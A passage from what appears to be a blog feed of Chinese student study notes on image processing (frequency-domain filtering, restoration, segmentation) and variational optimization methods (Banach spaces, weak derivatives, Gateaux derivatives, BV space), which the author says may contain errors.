$\bar{f}(x,y)$ 为模糊图 反锐化掩蔽的基本算法如下： $g(x,y)=f(x,y)+k[f(x,y)-\bar{f}(x,y)]$，$\bar{f}(x,y)$ 可以用局部平均法求得，如$$\frac{1}{9}\begin{bmatrix} 1 &amp; 1 &amp;1 \ 1 &amp; 1&amp;1\ 1 &amp; 1&amp;1 \end{bmatrix}$$反锐化掩蔽的一个特例是拉氏算子增强。反锐化掩蔽的普遍形式被称为高频提升滤波，定义如下：$$f_{hb}(x,y)=Af(x,y)-\bar f(x,y)$$ 第四章：频率域滤波频率域图像增强是对经过傅里叶变换后的频谱图操作，空间域是对像素操作 傅里叶变换：非周期函数可以用正弦/余弦乘以加权函数的积分来表示 傅里叶反变换：函数特征可通过反变换来重建，而不丢失任何信息 在频率域做图像增强的原因有：1. 一些在空间域难以表述的增强问题，在频率域变得很普通。2. 滤波在频率域更为直观。 模板=滤波器 滤波在频域上更简单 一维傅里叶正变换：$F(u)=\int_{-\infty}^{+\infty}f(x)e^{-j2\pi ux}dx$，其中 x 是空间变量，u 是频域变量，j 是复数的虚部，f(x) 是实变量 x 的连续函数，F(u) 是频率函数（有实部和虚部）。空间域用小写，频率域用大写。 傅里叶反变换：$f(x)=\int_{-\infty}^{+\infty}F(u)e^{j2\pi ux}du$ 离散形式：$$F(u)=\frac{1}{M}\sum_{x=0}^{M-1}f(x)e^{-j2\pi ux/M}$$ $$f(x)=\sum_{u=0}^{M-1}F(u)e^{j2\pi ux/M}$$ 实函数的傅里叶变换通常是复数，即 $F(u)=R(u)+jI(u)$，其极坐标表示为：$F(u)=|F(u)|e^{-j\phi(u)}$ 二维正 FT：$F(u,v)=\int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty}f(x,y)e^{-j2\pi (ux+vy)}dxdy$ 二维反 FT：$f(x,y)=\int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty}F(u,v)e^{j2\pi (ux+vy)}dudv$ 其中 f(x,y) 是连续图像函数 离散形式：$$F(u,v)=\frac{1}{MN}\sum_{x=0}^{M-1}\sum_{y=0}^{N-1}f(x,y)e^{-j2\pi(ux/M+vy/N)}$$ $$f(x,y)=\sum_{u=0}^{M-1}\sum_{v=0}^{N-1}F(u,v)e^{j2\pi(ux/M+vy/N)}$$ 一般 F(u,v) 是复函数，即 $F(u,v)=R(u,v)+jI(u,v)=|F(u,v)|e^{j\phi(u,v)}$ 在 FT 前常用 $(-1)^{x+y}$ 乘以输入图像（原点中心化） $\mathfrak{F}\lfloor f(x,y)(-1)^{x+y}\rfloor=F(u-M/2,v-N/2)$ 空域下原点对应频域坐标下 (M/2,N/2) $F(0,0)=\frac{1}{MN}\sum_{x=0}^{M-1}\sum_{y=0}^{N-1}f(x,y)$ 是 f(x,y) 的平均值，若 f(x,y) 为实函数，则其 FT 是对称的 FT 的 9 条性质(1) 平移性 ：$$f(x-x_0,y-y_0)=F(u,v)e^{-j2\pi(ux_0/M+vy_0/N)}$$ $$f(x,y)e^{j2\pi(u_0x/M+v_0y/N)}=F(u-u_0,v-v_0)$$ (2) 分配性（加法分配，无乘法分配性）$$\mathfrak{F}[f_1(x,y)+f_2(x,y)]=\mathfrak{F}[f_1(x,y)]+\mathfrak{F}[f_2(x,y)]$$(3) 尺度（比例）变换性（缩放）$$af(x,y)=aF(u,v)$$ $$f(ax,by)=\frac{1}{ab}F(u/a,v/b)$$ (4) 旋转性：原图旋转多少度，幅度频谱图也旋转多少度 (5) 周期性和对称性 周期性：$$F(u,v)=F(u+M,v)=F(u,v+N)=F(u+M,v+N)$$反变换也具有周期性 共轭对称性：$$F(u,v)=F^*(-u,-v)$$频谱对称性：$$|F(u,v)|=|F(-u,-v)|$$(6) 平均值 (7) 可分性：可先进行水平方向的变换再进行垂直方向的变换 (8) 卷积（*是卷积 $\cdot$ 是乘积，$f^* ()$比例变换） 在空域做卷积就相当于在频域做乘积，在空域做乘积就相当于在频域做卷积。 (9) 相关性 频率三大性质：1. 变换最慢的频率成分（原点）对应平均灰度级 2. 低频对应图像慢变化分量 3. 较高频对应变化较快的灰度级 频域图像增强频域中低频对应着原图中慢变化分量，高频对应着变化较快的分量。 包括：平滑的频域滤波器、频域锐化滤波器和同态滤波器 频率域滤波步骤： (1) 用 $(-1)^{x+y}$ 乘以输入图像来进行中心变换 (2) 计算图像的 DFT（离散傅里叶变换），即 F(u,v) (3) 用滤波器函数 H(u,v) 乘以 F(u,v)：$G(u,v)=H(u,v)F(u,v)$ (4) 计算 G(u,v) 的反 DFT，$f(x,y)=\mathfrak{F}^{-1}[G(u,v)]$ (5) 用 $(-1)^{x+y}$ 乘以滤波后图像的实部 陷波滤波器： 在点 (M/2,N/2) 处滤波器值为0，反之为1。可以让图像的平均值为0。 平滑的频域滤波器：灰度图中边缘和尖锐变化主要处于 FT 的高频部分，平滑可以通过衰减指定图像 FT 中高频成分的范围来实现。主要分为：理想低通滤波器、巴特沃斯低通滤波器和高斯低通滤波器。 理想低通滤波器（ILPF） 模糊振铃（水波样）$$\begin{equation}H(u,v)=\left{\begin{aligned}1;D(u,v)&amp;\leq D_0 \0;D(u,v)&amp;&gt;D_0 \ \end{aligned}\right.\end{equation}$$$D_0$ 为截至频率，D(u,v) 为 (u,v) 到频率矩形原点的距离。 $$D(u,v)=\sqrt{(u-M/2)^2+(v-N/2)^2}$$ $D_0$ 半径内的频率分量会无损通过，其他分量被滤除。 巴特沃斯低通滤波器（BLPF）n 阶巴特沃斯低通滤波器的传递函数为：$$H(u,v)=\frac{1}{1+[D(u,v)/D_0]^{2n}}$$一阶巴特沃斯滤波器没有振铃，阶数越高振铃越明显 高斯低通滤波器（GLPF）$$H(u,v)=e^{-D^2(u,v)/2\sigma^2}$$ 令 $\sigma=D_0$。 平滑后的图像无振铃现象，比 BLPF 处理后的图像更模糊一点。 频域锐化滤波器高频滤波器是使高频分量顺利通过，低频分量收到削弱。频率内常用高通滤波器有：理想高通滤波器、巴特沃斯高通滤波器和高斯高通滤波器。 理想高通滤波器（IHPF）$$\begin{equation}H(u,v)=\left{\begin{aligned}0;D(u,v)&amp;\leq D_0 \1;D(u,v)&amp;&gt;D_0 \ \end{aligned}\right.\end{equation}$$ n 阶巴特沃斯低通滤波器的传递函数为：$$H(u,v)=\frac{1}{1+[D_0/D(u,v)]^{2n}}$$ 高斯高通滤波器（GHPF） $$H(u,v)=1-e^{-D^2(u,v)/2D_0^2}$$ 频率域的拉普拉斯算子$$\mathfrak{F}[\frac{d^nf(x)}{dx^n}]=(2\pi ju)^nF(u)$$ $$\mathfrak{F}[\frac{d^2f(x,y)}{dx^2}+\frac{d^2f(x,y)}{dy^2}]=(2\pi ju)^2F(u,v)+(2\pi jv)^2F(u,v)$$ $$=-4\pi^2(u^2+v^2)F(u,v)$$ 频域的拉普拉斯算子可以由以下滤波器实现：$$H(u,v)=-4\pi^2(u^2+v^2)$$滤波器中心化：$$H(u,v)=-4\pi^2\lfloor(u-M/2)^2+(v-N/2)^2 \rfloor$$原始图像减去拉普拉斯算子部分，形成增强图像：$$g(x,y)=f(x,y)-\nabla^2f(x,y)$$ 可用单个滤波器完成该操作：$$g(x,y)=\mathfrak{F}^-{\lfloor1-4\pi^2(u-M/2)^2-4\pi^2(v-N/2)^2 \rfloor F(u,v)}$$反锐化模板：从一副图像减去其自身模糊图像而生成的锐化图像，可表示为：$f_{hp}(x,y)=f(x,y)-f_{lp}(x,y)$ 高频提升滤波：$f_{hb}(x,y)=Af(x,y)-f_{lp}(x,y)=(A-1)f(x,y)+f(x,y)-f_{lp}(x,y)$$=(A-1)f(x,y)+f_{hp}(x,y)$ 对应的，在频率域，反锐化模板为：$H_{hp}(u,v)=1-H_{lp}(u,v)$，高频提升滤波器为：$H_{hb}(u,v)=(A-1)+H_{hp}(u,v)$ 高频增强滤波：在高通滤波器函数前乘以一个常数，再增加一个偏移量以使零频率不被滤掉。$H_{hfe}(u,v)=a+bH_{hp}(u,v)$ 同态滤波器：照射反射模型：$f(x,y)=i(x,y)\cdot r(x,y)$，因 FT 不满足乘法分配率，所以在频域不可将其分开。可以取对数：$$\mathfrak{F}{z(x,y)}=\mathfrak{F}{\ln f(x,y)}=\mathfrak{F}{\ln i(x,y)}+\mathfrak{F}{\ln r(x,y)}$$其中 $z(x,y)=\ln f(x,y)$，也可写为：$Z(u,v)=F_i(u,v)+F_r(u,v)$ 用滤波函数 H(u,v) 处理 Z(u,v)：$$S(u,v)=H(u,v)Z(u,v)=H(u,v)F_i(u,v)+H(u,v)F_r(u,v)$$经过傅里叶反变换后得到空域中处理过的图像：$$s(x,y)=\mathfrak{F}^{-1}{S(u,v)}$$取指数：$$g(x,y)=e^{s(x,y)}$$同态滤波器的处理过程就是：1.取对数 2. DFT 3. 滤波 4. $(DFT)^{-1}$ 5.取 exp 同态滤波器分别作用于照射分量和反射分量，照射分量变化缓慢，反射分量在边缘处变化剧烈。图像对数的傅里叶变换后的低频部分对应照射分量，高频成分对应反射分量。同态滤波器可减弱低通分量，增强高通分量。 同态滤波器函数（不要求会）：$$H(u,v)=(\gamma_H-\gamma_L)[1-e^{-c(D^2(u,v)/D_0^2)}]+\gamma_L$$ $$\gamma_L&lt;1\quad且\quad\gamma_H&gt;1$$ c 是用来控制滤波器函数斜面的常数 第五章：图像复原图像退化/复原过程模型：f(x,y) -&gt; 退化 -&gt; 噪声 -&gt; 复原滤波 -&gt; f’(x,y)$$G(x,y)=H(x,y)F(x,y)+N(x,y)$$ $$g(x,y)=h(x,y)*f(x,y)+n(x,y)$$ 先退化（滤波）再加噪声，其中 * 是指卷积。 噪声主要有：高斯噪声、瑞利噪声、伽马噪声、指数分布噪声、均匀分布噪声和脉冲噪声（椒盐噪声）等。 如果图像仅受噪声影响，无退化等，则前面的式子就变成了：$$G(x,y)=F(x,y)+N(x,y)$$ $$g(x,y)=f(x,y)+n(x,y)$$ 噪声存在下的空间滤波复原1. 均值滤波器(1) 算术均值滤波器：计算 $m\times n$ 代谢奥邻域内的像素均值 (2) 几何均值滤波器：邻域内像素点相乘开 mn 次方 (3) 谐波均值滤波器 ：对盐噪声效果好，对胡椒噪声效果不好 (4) 逆谐波均值滤波器：泛化能力强 2. 顺序统计滤波器(1) 中值滤波器 (2) 最大/小值滤波器 (3) 中点滤波器：最大值和最小值之间的中点 (4) 修正后的阿尔法均值滤波器：去掉邻域内最高灰度值的 d/2 和最低灰度值的 d/2，计算剩余像素的平均值 3. 自适应滤波器基于均值和方差等统计特性，均值是区域中灰度平均值的度量，方差是区域中平均对比度的度量。 消除周期性噪声的滤波器1. 带阻滤波器2. 带通滤波器3. 陷波滤波器4. 最佳陷波滤波器估计退化函数几何变换映射和插值 第九章：数学形态学原理膨胀、腐蚀、开运算、闭运算、击中与否 边缘提取、区域填充、连接部分提取、凸壳算法、细化、粗化、 第十章：图像分割可以分为基于边缘检测的方法和基于区域生成的方法。前者主要有基于边缘检测的图像分割和基于阈值选取的图像分割，后者主要有区域生长、分裂-合并的分割方法。 间断检测点的检测、线的检测、边的检测（梯度算子、sobel算子、拉普拉斯算子等），这些检测模板系数和为0，并且在感兴趣的方向系数大。 边缘连接局部处理法（梯度和方向角）和霍夫变换 阈值分割法全局的、局部的、自适应的（取决于空间坐标x,y，将原图划分为小的子图，对子图分别进行不同的阈值处理） 最佳全局和自适应阈值（计算）基于区域的分割区域增长、区域分割-合并、分水岭算法 第十一章：图像的表示与描述表示方法 1. 链码链码、归一化链码、差分链码（首差）、归一化的差分链码 2. 多边形近似点合成法、边分裂法 3. 外形特征质心角函数 4. 边界分段5. 区域骨架边界描述子 1. 简单描述子边界周长、边界最大轴（边界直径）、边界最小轴、边界离心率、基本矩形 2. 形状数归一化的差分链码 傅里叶描述子]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[优化方法学习笔记]]></title>
    <url>%2F2019%2F09%2F24%2Foptimization%2F</url>
    <content type="text"><![CDATA[本文是关于本人研究生期间优化方法课程的学习笔记，仅仅是为了方便自己整理和记忆知识点，不能保证所提到知识点全部正确，并且文章结构可能会比较零碎和杂乱，尽量在一段时间后定期整理笔记。 伪逆：$$\begin{equation}A^+=\left{\begin{aligned}AA^+A&amp;=&amp;A \A^+AA^+&amp;=&amp;A^+ \(AA^+)^T&amp;=&amp;AA^+ \(A^+A)^T &amp; = &amp; A^+A \\end{aligned}\right.\end{equation}$$奇异值：$A^+A$ 的特征值再取根号 任何物体都可以看作是一个函数，灰度图可看作是从定义域 $\Omega$ 到值域 R 的函数，值域的取值范围是 [0,255]。而RGB图像可以看作是三个函数。 $R^n$ 是 n 维线性空间，$R^+$ 是正整数 线性空间 C ：对 $x_1,x_2\in C,\quad k\in R$ 满足8条性质，则称 C 为想向量空间。 内积 &lt;,&gt; 满足：1. $&lt;y,x&gt;=&lt;x,y&gt;$；2. $k&lt;x,y&gt;=k&lt;x,y&gt;$；3. $&lt;x,y&gt;^2\leq&lt;x,x&gt;&lt;y,y&gt;$ 距离有多种方式，其中欧式距离可以表示为：$d(x,y)=\sqrt{&lt;x-y,x-y&gt;}$ $L^p$ 范数：$||x||_p=\sqrt[p]{||x_1||^p+||x_2||^p+…+||x_n||^p}$ $||u_p^p||=\int |u(x)|^pdx$ 诱导范数：$||A||_1=sup{\frac{||Ax||_1}{||x||_1}}，x\in R^n$ 变分法Banach 空间：完备的线性赋范空间 完备：柯西序列${x_n}$收敛，即对于序列 $x_1,x_2,…,x_n$，对于任意大的数 N，若 $n,m &gt; N$，则 $|x_n-x_m|&lt;\epsilon$ 线性：$x_1,x_2\in A\Rightarrow k_1x_1+k_2x_2\in A$ 赋范：范数 $||\cdot||$ 满足： 正定性：$||x||\geq0$； 齐次性：$||kx||=k||x||，当且仅当（iff）x=0时取”=”$; 三角不等式：$||x+y||\leq ||x||+||y||$。 当为矩阵范数时，还应该额外满足：$||x\cdot y||\leq||x||\cdot||y||$ Hilbert（希尔伯特）空间：当为内积导出的 Banach 空间时为希尔伯特空间 函数的范数：$||f(x)||_p=(\int |f(x)|^p dx)^{\frac{1}{p}}$ $L^p$ 空间：$L^p(\Omega)={f(x)\quad|\quad||f(x)||_p&lt;+\infty}$，有 $L^1(\Omega)&gt;L^2(\Omega)&gt;L^3(\Omega)&gt;…$ 弱导数导数：$f’(x)=\lim_{x\rightarrow x_0}{\frac{f(x)-f(x_0)}{x-x_0}}$，连续光滑函数一定可导。 积分意义下的弱导数：若函数 u 连续但不光滑，并且对 $\forall \varphi\in C_c^1(\Omega)$ 有 $\int_{\Omega}{u\frac{\partial\varphi}{\partial x_0}dx=-\int_\Omega{v\varphi dx}}$，则称 $v\in L^1(\Omega)$ 是函数 u 沿 $x_i$ 方向的弱导数。 其中 $C_c^1(\Omega)$ 是一阶可导的连续紧致集（紧集）,紧致集是指在边界（端点）上为0 $\int_\Omega u\frac{\partial\varphi}{\partial x_i}dx=-\int_\Omega v\varphi dx$，记 $v=\frac{\partial u}{\partial x_i}$ $\int_\Omega u\nabla\varphi dx=-\int_\Omega v\varphi dx$，记 $v=\nabla u$（多元情况）（$\nabla\varphi\rightarrow\frac{\partial\varphi}{\partial x_1},…,\frac{\partial\varphi}{\partial x_n}$） $\int_\Omega u\varphi’dx=-\int_\Omega v\varphi dx$，记 $v=u’$，即 v 是 u 的弱导数。 a.e. （almost everywhere） 弱导数如果存在，则唯一。 对于某个点来说，导数存在则弱导数一定存在，并且弱导数等于导数，而弱导数存在导数不一定存在。 例： $f(x)=|x|,x\in[-1,1]$ 则 $\begin{equation}f’(x)=\left{\begin{aligned}-1 &amp; , &amp; x\in[-1,0] \1 &amp; , &amp; x\in(0,1]\end{aligned}\right.\end{equation}$ 在不可导点的弱导数一般可以取任意值。 测度意义下的弱导数：当函数是不光滑且不连续时，如$$\begin{equation}f(x)=\left{\begin{aligned}0 &amp; , &amp; x\in(-1,0) \1 &amp; , &amp; x\in(0,1)\end{aligned}\right.\end{equation}$$$D_u=\nabla udx+\delta x_0$ 有弱导数的地方取弱导数 $\nabla udx$，反之取 $\delta x_0$（间断点之间的高度）。 向前、向后差分 对偶空间对偶（dual）空间 x’：X 上有界线性泛函的全体（泛函数是函数的函数，即广义的函数） Banach 空间：（X $||\cdot||_X$） 线性：$f(\alpha x+\beta y)=\alpha f(x)+\beta f(y)$ 若 $L^p(\Omega)={u|\int|u|^pdx&lt;+\infty}$， $L^q(\Omega)={u|\int|u|^q dx&lt;+\infty}$，且 $\frac{1}{p}+\frac{1}{q}=1$，则称 $L^q(\Omega)$是 $L^p(\Omega)$的对偶。 Holder 不等式：$\int_\Omega f(x)g(x)dx\leq(\int_\Omega|f(x)|^p)^{\frac{1}{p}}(\int_\Omega|f(x)|^q)^{\frac{1}{q}}$，$\frac{1}{p}+\frac{1}{q}=1$ $L^1(\Omega)$的对偶是 $L^{\infty}(\Omega)$，$L^2(\Omega)$的对偶是 $l^2(\Omega)$。 (1) 强收敛：$x_n\xrightarrow[X]{} x\Leftrightarrow ||x_n-x||_X\rightarrow 0$ (2) 弱收敛：$x_n\xrightarrow[X]{}x\Leftrightarrow \forall l\in X’$ ，有 $l(x_n)-l(x)\rightarrow0$ 强收敛 $\Rightarrow$ 弱收敛，反之不可 能量函数 $E(u)=\int_\Omega|u|^2dx+\int_\Omega|u-f_0|^2dx$，其中 u 是关于x 的函数。（泛函数的值为能量） $min_u E(u)$ 的存在性： (1) $E(u)\not\equiv\infty$（不恒等），$u_n\subset X,\lim_{n\rightarrow\infty}E(u_n)=\inf_{u\in X}E(u)$，其中 X 是 Banach 空间，inf 是下界函数。 (2) E(u) 具有强制性，即 $||u||_x\rightarrow \infty\Rightarrow E(u)\rightarrow\infty$ (3) $E(u_0)\leq\lim_{j\rightarrow\infty}E(u_{n_j})=\inf E(u)$ 判断一个函数是否为凸函数：$\nabla^2E\geq 0$，若 $\nabla^2E\geq 0$，则Hessian矩阵半正定。 下半连续性 $l.s.c.$：若对 $x_n\xrightarrow[X]{} x_0$ 有 $E(x_0)\leq lim_{n\rightarrow+\infty}E(x_n)$，则称 E 为 $l.s.c.$。 弱下半连续性（$w.l.s.c.$）：若对 $x_n\xrightarrow[X]{} x_0$ 有 $E(x_0)\leq \lim_{n\rightarrow+\infty}E(x_n)$，则称 E 为 $w.l.s.c.$。 如果 E 是凸函数，则 $l.s.c.$ 和 $w.l.s.c.$ 等价。 $\forall \xi&gt;0,\exists x_0$ 开邻域 V，使得 $\forall x\in V$，有 $f(x)&gt;f(x_0)-\xi\Rightarrow f$ 为 $l.s.c.$ 最优条件（Optimal condition）Gateaux derivative：$E:x\rightarrow R$，若 $E’(u,v)=\frac{E(u+tv)-E(u)}{t}$ 存在，则称 $E’(u,v)$ 为 $E(u)$ 在 u 处沿 v 方向的导数。 若 $\exists \tilde u\in X’$，使得（s.t.）$\tilde u(v)=E’(u,v)$ 对任意 v 都成立，则称 E 在 u 处 Gateaux 可导，记为 $E’(u)=\tilde u$ 或 $\frac{\delta E(u)}{\delta u}=\tilde u$ $\tilde u(v)=\int_\Omega\tilde uvdx$是线性的。$$E’(u,v)=\lim_{t\rightarrow0}\frac{E(u+tv)-E(u)}{t}$$ $$=\lim_{t\rightarrow0}\frac{\int_\Omega|u+tv|^2+|u+tv-f|^2dx-\int_\Omega|u|^2+|u-f|^2dx}{t}$$ $$=\lim_{t\rightarrow0}\frac{2\int_\Omega(u+tv)v+(u+tv-f)vdx}{1}$$ $$=2\int_\Omega[uv+(u-f)v]dx=2\int_\Omega[u+u-f]vdx$$ $$E’(u)=4u-2f$$ $$E’(u,v)=\frac{d E(u+tv)}{dt}|_{t=0}$$ $$E(u)=\int_\Omega|\nabla u|dx+\frac{\lambda}{2}\int_\Omega|u-f|^2dx$$ $$E’(u,v)=\frac{d E(u+tv)}{dt}|_{t=0}$$ $$=\frac{\int_\Omega|\nabla (u+tv)|+\frac{\lambda}{2}\int_\Omega|u+tv-f|^2dx}{dt}|_{t=0}$$ $$=\int_\Omega&lt;\frac{(\nabla u+t\nabla v)}{|\nabla(u+tv)|’},\nabla v&gt;+\lambda(u+tv-f)vdx|_{t=0}$$ $$\int_\Omega&lt;\frac{\nabla u}{|\nabla u|},\nabla v&gt;+\lambda(u-f)vdx=\int_\Omega[\nabla^T(\frac{\nabla u}{|\nabla u|})+\lambda(u-f)]vdx$$ $&lt;AB,C&gt;=&lt;B,A^TC&gt;$ $&lt;\nabla u,\phi&gt;=&lt;u,-\nabla^T\phi&gt;$，其中 $\nabla^T=-div$ ，即散度。 最优性条件给定 f(x) 求 f’(x)=0 E(u)， u, v 是关于 x 的函数 $E(u,v)=E(u+tv)$ 方向导数 $E’(u,v)=\frac{dE(u+tv)}{dt}|_{t=0}$ $E’(u,v)=\int_\Omega E’(u)vdx$ 求 E’(u)=0 例：$$E(u)=\int_\Omega|\nabla u|dx+\int_\Omega(u-f)^2dx$$ $$=\int_\Omega{|\nabla u|+(u-f)^2}dx$$ $$E(u,v)=E(u+tv)=\int_\Omega{|\nabla(u+tv)|+((u+tv)-f)^2}dx$$ $$\frac{dE(u+tv)}{dt}|{t=0}=\frac{\int_\Omega d {|\nabla(u+tv)|+((u+tv)-f)^2}dx}{dt}|{t=0}$$ 求导和积分可以互换$$\frac{\int_\Omega{|\nabla(u+tv)|+((u+tv)-f)^2}dx}{dt}|_{t=0}dx$$ $$=\int_\Omega&lt;\frac{\nabla u+t\nabla v}{|\nabla u+t\nabla v|},\nabla v&gt;+2v(u+tv-f)|_{t=0}dx$$ $$=\int_\Omega&lt;\frac{\nabla u}{|\nabla u|},\nabla v&gt;+2v(u-f)dx$$ 因 $&lt;a,bc&gt;=b^Tac$ ，其中 b 可以是 $\nabla，\nabla^T$ 等，故 $&lt;\frac{\nabla u}{|\nabla u|},\nabla v&gt;=\nabla^T\frac{\nabla u}{|\nabla u|}v$$$=\int_\Omega[\nabla^T(\frac{\nabla u}{|\nabla u|})+2(u-f)]vdx$$ 故$$E’(u)=\nabla^T(\frac{\nabla u}{|\nabla u|})+2(u-f)=-div(\frac{\nabla u}{|\nabla u|})+2(u-f)$$ 线性算子满足： $\nabla(f+g)=\nabla f+\nabla g$ $\nabla(u+tv)=\nabla u+\nabla(tv)=\nabla u+t\nabla v$$$\frac{d|x|}{dx}=\frac{x}{|x|}$$$&lt;AB,C&gt;=&lt;B,A^TC&gt;=&lt;C^TAB,I&gt;$ $&lt;\nabla u,v&gt;=&lt;u,\nabla^Tv&gt;$ $\nabla^T=-dw$ ，即梯度等于负的散度 例：$$E(u)=\int_\Omega f(x,u,\nabla u)dx$$ $$E(u,v)=E(u+tv)=\int_\Omega f[x,u+tv,\nabla(u+tv)]dx$$ $$\frac{dE(u+tv)}{dt}|{t=0}=\frac{d\int_\Omega f[x,u+tv,\nabla(u+tv)]dx}{dt}|{t=0}$$ $$=\frac{\int_\Omega d f[x,u+tv,\nabla(u+tv)]}{dt}|_{t=0}dx$$ $$=\int_{\Omega}(f_1’\cdot0+f_2’\cdot v+&lt;f_3’\cdot\nabla v&gt;)|_{t=0}dx$$ $$=\int_\Omega f_2’\cdot v+\nabla^Tf_3’\cdot vdx$$ $$E’(u)=f_2’+\nabla^Tf_3’$$ $|\nabla u|$ 是平方和开根号，$\nabla^2 u$ 是线性的，$\Delta=-\nabla^T\nabla=div(\nabla)$ ，$\Delta$ 表示拉普拉斯$$\nabla^2 u=\begin{bmatrix} \nabla_{ww}u&amp; &amp;\nabla_{wh}u \ \nabla_{hw}u&amp; &amp;\nabla_{hh}u\end{bmatrix}$$ $$|\nabla^2u|=\sqrt{\nabla_{ww}^2u+\nabla_{wh}^2u+\nabla_{hw}^2u+\nabla_{hh}^2u}$$ 例：$$E(u)=\int_\Omega\sqrt{1+|\nabla u|^2}+|\nabla^2u|dx$$ $$E(u,v)=E(u+tv)=\int_\Omega\sqrt{1+|\nabla(u+tv)|^2}+|\nabla^2(u+tv)|dx$$ $$E’(u,v)=\frac{dE(u,v)}{dt}|{t=0}=\frac{\int_\Omega d\sqrt{1+|\nabla(u+tv)|^2}+|\nabla^2(u+tv)|}{dt}|{t=0}dx$$ $$=\int_\Omega\frac{2|\nabla(u+tv)|}{2\sqrt{1+|\nabla(u+tv)|^2}}\cdot&lt;\frac{\nabla(u+tv)}{|\nabla(u+tv)|},\nabla v&gt;+&lt;\frac{\nabla^2(u+tv)}{|\nabla^2(u+tv)|},\nabla^2v&gt;|_{t=0}dx$$ $$=\int_\Omega[\frac{\nabla^T\nabla u}{\sqrt{1+|\nabla u|^2}}+\frac{(\nabla^2)^T\nabla^2 u}{|\nabla^2 u|}]\cdot vdx$$ $$=\int_\Omega[\frac{\Delta u}{\sqrt{1+|\nabla u|^2}}+\frac{(\nabla^2)^T\nabla^2 u}{|\nabla^2 u|}]\cdot vdx$$ $$E’(u)=-\frac{\Delta u}{\sqrt{1+|\nabla u|^2}}+(\nabla^2)^T\frac{\nabla^2 u}{|\nabla^2 u|}$$ $\Delta=diw(\nabla)$ 貌似矛盾！！！！！！！！！！！！！！！！！！！！！！ 例：$$E(u)=\int_\Omega|\nabla u|^2dx$$ $$E(u,v)=E(u+tv)=\int_\Omega|\nabla(u+tv)|^2dx$$ $$\frac{dE(u+tv)}{dt}|{t=0}=\frac{\int_\Omega d|\nabla(u+tv)|^2}{dt}|{t=0}dx$$ $$=\int_\Omega2&lt;\nabla(u+tv),\nabla v&gt;|_{t=0}dx$$ $$=\int_\Omega2&lt;\nabla(u),\nabla v&gt;dx$$ $$=\int_\Omega2\nabla^T\nabla u\cdot vdx$$ $$E’(u)=2\nabla^T\nabla u=-2div\nabla u=-2\Delta u$$ 例：$$E(u)=\int_\Omega|\nabla^2u|+\frac{\lambda}{2}(u-f)^2dx$$ $$E(u,v)=E(u+tv)=\int_\Omega|\nabla^2(u+tv)|+\frac{\lambda}{2}(u+tv-f)^2dx$$ $$\frac{dE(u+tv)}{dt}|{t=0}=\frac{\int_\Omega d|\nabla^2(u+tv)|+\frac{\lambda}{2}(u+tv-f)^2}{dt}|{t=0}dx$$ $$=\int_\Omega&lt;\frac{\nabla^2(u+tv)}{|\nabla^2(u+tv)|},\nabla^2v&gt;+\lambda v(u+tv-f)|_{t=0}dx$$ $$=\int_\Omega&lt;\frac{\nabla^2u}{|\nabla^2u|},\nabla^2v&gt;+\lambda v(u-f)|_{t=0}dx$$ $$=\int_\Omega[(\nabla^2)^T\frac{\nabla^2u}{|\nabla^2u|}+\lambda(u-f)]vdx$$ $$E’(u)=(\nabla^2)^T\frac{\nabla^2u}{|\nabla^2u|}+\lambda(u-f)$$ $\nabla^T\nabla=-\Delta$ 若 $E(u)=\int|u-f|^2dx=||u-f||_2^2$ 去积分求导： $2(u-f)=2(u-f)$ 若去掉平分，求导 $\frac{u-f}{|u-f|}$ 若 $E(u)=\int|\nabla u-f|dx=||\nabla u-f||_2$ 不看积分求导（对u求导）：$\nabla^T\frac{\nabla u-f}{|\nabla u-f|}$ 以上结论不可直接用！！！ $\nabla u$ 可对 u 求导，求导结果为 $\nabla^T$，$\nabla^T$ 写到前面 无 $\nabla$ 正常求，有 $\nabla$ 则按 $&lt;AB,C&gt;=&lt;C^TAB,I&gt;=&lt;B,A^TA&gt;=&lt;B^TA^T,C^T&gt;=&lt;A^T,BC^T&gt;$ 求$$\nabla^T(\frac{\nabla u}{|\nabla u|})\neq-\frac{\Delta u}{|\nabla u|}$$$|\nabla u|$ 不是常数 BV 空间$$V_u(x_0,…,x_n)=\sum_{i=1}^n|u(x_i)-u(x_{i-1})|$$ 称 u 为关于 $x_0,…,x_n$ 的变差（variation） 若 $\exists M$ s.t. 关于 [a,b] 分割的上界 $\sup V_u(x_0,…,x_n)&lt;M$，则称 u 具有有界变差（Bounded Variation，BV），称关于 [a,b] 分割的 $\sup V_u(x_0,…,x_n)$ 为 u 的全变差（Total variation, TV）（所有分段单调函数端点的高度差）。函数不一定有 TV 有界变差函数的集合为 BV 空间$$\int_\Omega|Du|=\sup{\int_\Omega u\cdot div\varphi dx,\varphi\in C_0^1(\Omega)^n,||\varphi||{\infty}\leq1}$$其中 $\varphi\in C_0^1(\Omega)^n$ 的含义是 $\varphi={\varphi_1,…,\varphi_n}$，$div\varphi=\sum{i=1}\frac{\partial\varphi_i}{\partial X_i}$，$||\varphi||\infty=\sup_X\sqrt{\sum{i=1}\varphi^2_i(x)}$$$\int_\Omega u\cdot div\varphi dx=&lt;u,div\varphi&gt;=-&lt;u,\nabla^T\varphi&gt;=-&lt;\nabla u,\varphi&gt;$$ $&lt;u,v&gt;=\int_\Omega uvdx$，$\nabla^T=-di$v $&lt;\alpha,x&gt;$ 且 $||x||_\infty\leq1$，则 $&lt;\alpha,x&gt;$ 最大值为 $|\alpha|$，最小值为 $-|\alpha|$，$-&lt;\nabla u,\varphi&gt;$ 的最大值为 $|\nabla u|$，前提是 $\nabla u\quad\exists$ 若 $\int_\Omega|\nabla u|&lt;\infty$，则 u 具有 BV，$\int_\Omega|\nabla u|$ 为 TV $BV={u\in L’(\Omega)|\int_\Omega|Du|&lt;\infty}$，$u\in L’,\nabla u\quad\exists$ 且 $\int |Du|dx&lt;\infty$，则属于 W’ 空间]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[深度学习：经典卷积神经网络和目标检测网络]]></title>
    <url>%2F2019%2F09%2F17%2Fobjective-detection%2F</url>
